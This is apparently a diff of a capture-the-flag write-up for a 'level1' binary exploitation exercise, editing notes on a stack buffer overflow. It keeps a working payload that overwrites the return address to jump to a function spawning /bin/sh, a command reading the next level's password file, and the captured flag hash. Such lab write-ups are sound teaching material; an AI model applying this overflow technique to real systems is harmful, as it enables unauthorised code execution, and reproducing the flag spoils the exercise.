@@ -16,30 +16,13 @@ Wait input and exit after press Enter.
 ....
    0x08048479 <+53>:	call   0x8048360 <system@plt> <------- system call
 ... 
-We system call
-Check argument:
-	(gdb) x/s 0x8048584
-0x8048584:	 "/bin/sh"
-4. Make EIP offset:
-	python -c 'print "B"*80' > /tmp/payload
-Run with it:
-	(gdb) r < /tmp/payload
-Starting program: /home/user/level1/level1 < /tmp/payload
 
-Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-Buffer is overwritten.
-5. Make offset less:
-	python -c 'print "B"*80' > /tmp/payload
-Run with it:
-	(gdb) r < /tmp/payload
-Starting program: /home/user/level1/level1 < /tmp/payload
+Because we have array which size 76, we could overflow it and call our own function
+run. Function run have address 0x08048444.
+Therefore we write 76 litters 'B' and after it paste address of pointer to function run.
 
-Program received signal SIGILL, Illegal instruction.
-0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
-It's ok
 6. Do it with address of function run 0x08048444:
-	python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
+	python -c 'print "B"*76 + "\x44\x84\x04\x08"' > /tmp/payload
 	cat /tmp/payload - | ./level1
 	cat /home/user/level2/.pass
 	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
